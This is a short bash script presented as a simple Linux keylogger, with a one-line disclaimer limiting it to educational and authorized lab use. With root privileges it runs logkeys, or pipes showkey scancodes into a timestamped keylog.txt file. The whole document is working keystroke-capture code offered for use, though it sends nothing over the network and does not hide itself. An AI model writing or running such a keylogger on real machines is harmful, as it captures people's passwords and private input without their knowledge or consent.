#!/bin/bash

# Simple Bash keylogger (Linux, requires root and 'showkey' or 'logkeys')
# For educational and authorized lab use only.

LOG_FILE="keylog.txt"

if command -v logkeys &> /dev/null; then
    echo "[INFO] Using logkeys for keylogging."
    sudo logkeys --start --output "$LOG_FILE"
elif command -v showkey &> /dev/null; then
    echo "[INFO] Using showkey for keylogging. Press Ctrl+C to stop."
    sudo showkey --scancodes | while read -r line; do
        echo "$(date --iso-8601=seconds) - $line" >> "$LOG_FILE"
    done
else
    echo "[ERROR] Neither 'logkeys' nor 'showkey' is installed. Please install one of them."
    exit 1
fi